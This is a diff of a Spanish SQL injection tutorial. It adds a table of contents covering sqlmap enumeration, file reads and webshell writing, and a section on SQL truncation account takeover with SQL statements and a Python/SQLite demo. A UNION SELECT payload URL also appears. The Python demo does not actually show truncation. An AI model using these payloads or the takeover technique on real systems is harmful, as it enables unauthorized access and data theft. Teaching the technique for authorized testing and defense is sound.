@@ -1,18 +1,57 @@
 # 📚 Guía Básica de Inyección SQL (SQLi) Manual y Automatizada
 
+
+
 ---
 
 ## 📑 Índice
 
-1. ¿Qué es una SQL Injection?
-2. ¿Por qué ocurre?
-3. Ejemplo sencillo
-4. Cómo detectar la vulnerabilidad
-5. Inyecciones comunes (manuales)
-6. Automatizar el ataque con sqlmap
-7. Ataques avanzados con sqlmap
-8. Guía de ataque manual (UNION SELECT)
-9. Resumen de ataque manual
+### 1. Introducción
+- [❓ ¿Qué es una SQL Injection?](#❓-qué-es-una-sql-injection)
+- [📌 ¿Por qué ocurre?](#📌-por-qué-ocurre)
+
+### 2. Conceptos Básicos
+- [🔍 Ejemplo sencillo](#🔍-ejemplo-sencillo)
+- [🔍 ¿Cómo detectar la vulnerabilidad?](#🔍-cómo-detectar-la-vulnerabilidad)
+- [📝 Inyecciones comunes (manuales)](#inyecciones-comunes-manuales)
+
+### 3. Automatización con sqlmap
+- [🤖 Automatizar el ataque](#🤖-automatizar-el-ataque)
+  - [1️⃣ Buscar bases de datos](#1️⃣-buscar-bases-de-datos)
+  - [2️⃣ Enumerar tablas](#2️⃣-enumerar-las-tablas)
+  - [3️⃣ Enumerar columnas](#3️⃣-enumerar-las-columnas)
+  - [4️⃣ Extraer datos](#4️⃣-extraer-los-datos)
+- [🎯 Ataques avanzados con sqlmap](#🎯-ataques-avanzados-con-sqlmap)
+  - [🔹 Especificar parámetro vulnerable](#🔹-especificar-el-parámetro-vulnerable)
+  - [🔹 Aumentar nivel y riesgo](#🔹-aumentar-el-nivel-y-riesgo-del-ataque)
+  - [🔹 Uso de cookies](#🔹-usar-cookies)
+  - [🔹 Obtener usuario actual](#🔹-obtener-el-usuario-actual)
+  - [🔹 Obtener versión del motor](#🔹-obtener-versión-del-motor)
+  - [🔹 Leer archivos](#🔹-leer-archivos)
+  - [🔹 Escribir archivos (WebShell)](#🔹-escribir-archivos-webshell)
+
+### 4. Guía de ataque manual (UNION SELECT)
+- [🛠️ Paso 1️⃣ Detectar vulnerabilidad](#🛠️-paso-1️⃣-detectar-la-vulnerabilidad)
+- [🛠️ Paso 2️⃣ Identificar número de columnas](#🛠️-paso-2️⃣-identificar-el-número-de-columnas)
+- [🛠️ Paso 3️⃣ Usar UNION SELECT](#🛠️-paso-3️⃣-usar-union-select)
+- [🛠️ Paso 4️⃣ Extraer datos reales](#🛠️-paso-4️⃣-extraer-datos-reales)
+- [🛠️ Paso 5️⃣ Listar bases de datos](#🛠️-paso-5️⃣-listar-bases-de-datos)
+- [🛠️ Paso 6️⃣ Listar nombres de tablas](#🛠️-paso-6️⃣-listar-nombres-de-tablas)
+- [🛠️ Paso 7️⃣ Listar columnas](#🛠️-paso-7️⃣-listar-columnas)
+- [🛠️ Paso 8️⃣ Mostrar datos concatenados](#🛠️-paso-8️⃣-mostrar-datos-concatenados)
+- [✅ Notas importantes](#✅-notas)
+
+### 5. Ataques específicos
+- [🗂️ SQL Truncation Attack](#🗂️-sql-truncation-attack)
+  - [¿Qué supone?](#qué-supone)
+  - [Ejemplo simple](#ejemplo-simple)
+  - [Ejemplo en código (Python + SQLite)](#ejemplo-en-código-python--sqlite-🐍)
+  - [Resumen y recomendaciones](#resumen-📝)
+
+---
+
+
+   
 
 ---
 
@@ -324,6 +363,126 @@ http://ejemplo.com/product.php?id=1 UNION SELECT 1,CONCAT(<COLUMNA1>,0x3a,<COLUM
 - Probar siempre en entornos de prueba autorizados.
 
 ---
+
+
+## 🗂️ SQL Truncation Attack 
+
+El **SQL truncation** es una técnica que explota cómo algunas bases de datos o aplicaciones manejan cadenas de texto más largas de lo permitido por el esquema de la base de datos.
+
+### ¿Qué supone esto?
+
+Supongamos que tenemos un panel de registro y conocemos un usuario administrador, por ejemplo:
+
+```
+admin
+```
+
+Vamos a intentar registrar un usuario así:
+
+```
+admin                               lala
+```
+
+Aquí viene el truco: si el campo `username` es `VARCHAR(8)` (es decir, máximo 8 caracteres), ocurre lo siguiente:
+
+- Algunas bases de datos lo **recortan** automáticamente (truncamiento).
+- Otras bases de datos dan **error**.
+
+Si la aplicación no controla esto bien, puede causar:
+
+- Fallos de autenticación.
+- Saltarse restricciones de `UNIQUE`.
+- Confusión en los registros.
+
+👉 En este caso, la aplicación acaba **sobrescribiendo** al usuario `admin` con nuestra contraseña. Luego, tendremos acceso como el admin legítimo.
+
+---
+
+## Ejemplo simple 📋
+
+### Tabla de usuarios:
+
+```sql
+CREATE TABLE users (
+    username VARCHAR(8) UNIQUE,
+    password VARCHAR(100)
+);
+```
+
+### 1️⃣ Usuario legítimo:
+
+```sql
+INSERT INTO users (username, password)
+VALUES ('admin', 'securepass');
+```
+
+### 2️⃣ Atacante intenta crear:
+
+```sql
+INSERT INTO users (username, password)
+VALUES ('admin             lala', 'hackedpass');
+```
+
+### Resultado:
+
+- `'admin             lala'` se **trunca** a `'admin'`.
+- Si `'admin'` no existía, se guarda.
+- Si `'admin'` ya existía, puede:
+  - Dar un **error** (violación de `UNIQUE`), o
+  - **Sobrescribir** al usuario `admin`, dependiendo de cómo esté implementada la lógica de inserción (por ejemplo, si se hace `INSERT OR REPLACE` o `ON DUPLICATE KEY UPDATE`).
+
+---
+
+## Ejemplo en código (Python + SQLite) 🐍
+
+```python
+import sqlite3
+
+# Crear la base de datos en memoria
+conn = sqlite3.connect(":memory:")
+c = conn.cursor()
+
+# Crear la tabla
+c.execute("""
+CREATE TABLE users (
+    username TEXT UNIQUE,
+    password TEXT
+)
+""")
+
+# Insertar usuario legítimo
+c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ("admin", "securepass"))
+
+# Intento de ataque con truncamiento
+try:
+    c.execute("INSERT INTO users (username, password) VALUES (?, ?)", ("admin           lala", "hackedpass"))
+except sqlite3.IntegrityError as e:
+    print("IntegrityError:", e)
+
+# Ver los usuarios
+for row in c.execute("SELECT username, password FROM users"):
+    print(row)
+
+conn.close()
+```
+
+---
+
+## Resumen 📝
+
+- SQL truncation es un ataque muy sencillo pero efectivo si el tamaño de los campos no está bien validado.
+- Permite, en ciertos casos, **tomar control** de cuentas ya existentes.
+- Es importante:
+  - Validar el tamaño del campo en la aplicación.
+  - No confiar únicamente en la base de datos.
+  - Normalizar (trim, pad) los datos de entrada y de consulta.
+
+---
+
+
+
+
+
 
 
 
